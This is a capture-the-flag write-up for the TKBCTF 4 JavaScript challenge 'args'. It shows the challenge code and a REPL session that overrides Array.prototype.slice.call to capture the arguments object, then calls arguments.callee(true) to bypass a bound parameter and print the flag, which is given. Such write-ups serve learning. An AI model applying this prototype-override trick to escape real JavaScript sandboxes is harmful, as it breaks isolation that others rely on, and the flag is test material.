---
title: "TKBCTF 4 - args"
tags:
  - tkbctf4
  - writeup
  - web
---

Second javascript challenge for the CTF. Similar in concept to the previous
javascript challenge, rand, you are given a Sandboxed node.js REPL to play with.

This one we did not manage to solve in time. It was a duh! moment when *akiym*
mentioned *arguments.callee* on the IRC. Stupidly assuming that the callee was
the currently executing function (i.e. our overwritten
`Array.prototype.slice.call` function) we did not think to examine it closer.

Lesson learnt!

Okay, so when connecting to the service, we get the following code:

```javascript
$ nc 203.178.132.117 24089
var g = (function () {
  var FLAG = 'FLAG_IS_HIDDEN_HERE';

  function f (flg /* args[]... */) {
    this.args = arguments;
    if (flg) {
      return FLAG;
    } else {
      return Array.prototype.slice.call(this.args, 1).join(', ');
    }
  }

  return f.bind(null, false);
})();

// Good luck!
args>
```

It looks like we need to call the function assigned to 'g' with the first
argument set to true so that the flag will be printed. However, the caveat here
is that the function is always called with the value of false prepended.

This is due to the function binding here:

```javascript
  return f.bind(null, false);
```

So what we need is to call the function without that bound context. What we need
to do first is to obtain a reference to arguments.

```javascript
args> var gl
undefined
args> Array.prototype.slice.call = function(i,v) {gl=i;return[]}
function (i,v) {gl=i;return[]}
args> g("")
""
args> gl
[object Arguments]
args>
```

With this reference, we can proceed to call the function with our own values
(i.e. true).

```javascript
args> gl
[object Arguments]
args> gl.callee(true)
"FLAG{3d2dba5b774814fa8fe87798898b7b30}"
args>
```

Flag: **FLAG{3d2dba5b774814fa8fe87798898b7b30}**

